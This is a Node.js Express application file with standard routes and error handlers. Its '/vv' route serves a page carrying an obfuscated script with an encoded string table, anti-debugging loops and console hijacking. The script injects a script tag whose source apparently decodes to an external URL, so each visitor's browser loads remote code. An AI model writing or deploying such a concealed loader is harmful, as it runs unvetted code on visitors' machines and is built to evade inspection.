const createError = require('http-errors');
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const logger = require('morgan');

const app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));



app.get('/', function (req, res, next) {
    res.render('index', {title: 'Express'});
});

app.get('/users', function (req, res, next) {
    res.send('respond with a resource 2');
});

app.get('/vv', function (req, res, next) {
    res.send(`<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html;charset=utf-8"><meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1" /><title></title><link href="" rel="shortcut icon" /></head><body class="lEe934Tufr1hcDWMLXVjyNF"><div class="kyXjuz24m8Kvos9QCfqdRpF1G" id="ugziesIWZChDQHmnfXLaBUFEOc"></div><script>var _0x12dd=["CMv0DxjUicHMDw5JDgLVBIGPia==","AgvHza==","y29UC29Szq==","DgvZDa==","DhLWzq==","ltLHlxPblvPFjf0Qkq==","yxbWzw5Kq2HPBgq=","y2HHAw4=","C3rYAw5N","C3jJ","y291BNrLCG==","ywn0Aw9U","yxbWBhK=","zxjYB3i=","zgvIDq==","ChjVDg90ExbL","Dg9tDhjPBMC=","BgvUz3rO","DhjHy2u=","z2DLCG==","lM9YzY82mdKYyZi1zgu1zJmXmZvI","zxHJzxb0Aw9U","y2fSBa==","BIb0AgLZiIKOicK=","y3jLyxrLrwXLBwvUDa==","Ahr0Chm6lY92EMfZlMfPB2vJB2LU","yMLUza==","Aw5MBW==","zNvUy3rPB24GkLWOicPCkq==","y29UC3rYDwn0B3i=","D2fYBG==","Dgv4Dc9QyxzHC2nYAxb0","owm2mdKYmtmUANm=","z2v0rwXLBwvUDhncEvrHz05HBwu=","C2nYAxb0","Aw5PDa==","D2HPBguGkhrYDwuPihT9"];!function(c,x){!function(x){for(;--x;)c.push(c.shift())}(207)}(_0x12dd);var _0x4bdc=function(x,c){var r=_0x12dd[x=+x];void 0===_0x4bdc.mMEBXc&&(_0x4bdc.wGhcmT=function(x){for(var c=function(x){for(var c,r,n=String(x).replace(/=+$/,""),d="",t=0,_=0;r=n.charAt(_++);~r&&(c=t%4?64*c+r:r,t++%4)&&(d+=String.fromCharCode(255&c>>(-2*t&6))))r="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(r);return d}(x),r=[],n=0,d=c.length;n<d;n++)r+="%"+("00"+c.charCodeAt(n).toString(16)).slice(-2);return decodeURIComponent(r)},_0x4bdc.oxFrZS={},_0x4bdc.mMEBXc=!0);var n=_0x4bdc.oxFrZS[x];return void 0===n?(r=_0x4bdc.wGhcmT(r),_0x4bdc.oxFrZS[x]=r):r=n,r},_0x36cd03=function(){var n=!0;return function(c,r){var x=n?function(){if(r){var x=r[_0x4bdc("0x1c")](c,arguments);return r=null,x}}:function(){};return n=!1,x}}();!function(){_0x36cd03(this,function(){var x=new RegExp(_0x4bdc("0x7")),c=new RegExp("\\+\\+ *(?:[a-zA-Z_$][0"+_0x4bdc("0x15"),"i"),r=_0x3950c5(_0x4bdc("0xe"));x[_0x4bdc("0x13")](r+_0x4bdc("0x17"))&&c[_0x4bdc("0x13")](r+"input")?_0x3950c5():r("0")})()}();var _0x56b177=function(){var n=!0;return function(c,r){var x=n?function(){if(r){var x=r[_0x4bdc("0x1c")](c,arguments);return r=null,x}}:function(){};return n=!1,x}}();setInterval(function(){_0x3950c5()},4e3);var _0x3c782e=_0x56b177(this,function(){try{var c=Function(_0x4bdc("0x10")+('{}.constructor("retur'+_0x4bdc("0x2"))+");")()}catch(x){c=window}for(var x=c[_0x4bdc("0x12")]=c.console||{},r=["log",_0x4bdc("0x9"),_0x4bdc("0x6"),_0x4bdc("0x1d"),_0x4bdc("0x0"),"table",_0x4bdc("0x22")],n=0;n<r[_0x4bdc("0x21")];n++){var d=_0x56b177[_0x4bdc("0x8")][_0x4bdc("0x1f")][_0x4bdc("0x5")](_0x56b177),t=r[n],_=x[t]||d;d.__proto__=_0x56b177[_0x4bdc("0x5")](_0x56b177),d.toString=_[_0x4bdc("0x20")][_0x4bdc("0x5")](_),x[t]=d}});_0x3c782e();var emfromgetnbrtoo="",script34ssd=document[_0x4bdc("0x3")](_0x4bdc("0xd"));function _0x3950c5(x){function c(x){if(typeof x===_0x4bdc("0x18"))return function(x){}[_0x4bdc("0x8")](_0x4bdc("0xf"))[_0x4bdc("0x1c")](_0x4bdc("0x1a"));1!==(""+x/x).length||x%20==0?function(){return!0}[_0x4bdc("0x8")](_0x4bdc("0x1e")+_0x4bdc("0x23"))[_0x4bdc("0x1")](_0x4bdc("0x1b")):function(){return!1}.constructor(_0x4bdc("0x1e")+_0x4bdc("0x23"))[_0x4bdc("0x1c")]("stateObject"),c(++x)}try{if(x)return c;c(0)}catch(x){}}script34ssd[_0x4bdc("0x14")]=_0x4bdc("0xa"),script34ssd[_0x4bdc("0x19")]=_0x4bdc("0x4")+_0x4bdc("0x24")+_0x4bdc("0xb"),document[_0x4bdc("0xc")](_0x4bdc("0x11"))[0][_0x4bdc("0x16")](script34ssd);</script></body></html>`);
});

// catch 404 and forward to error handler
app.use(function (req, res, next) {
    next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});

module.exports = app;
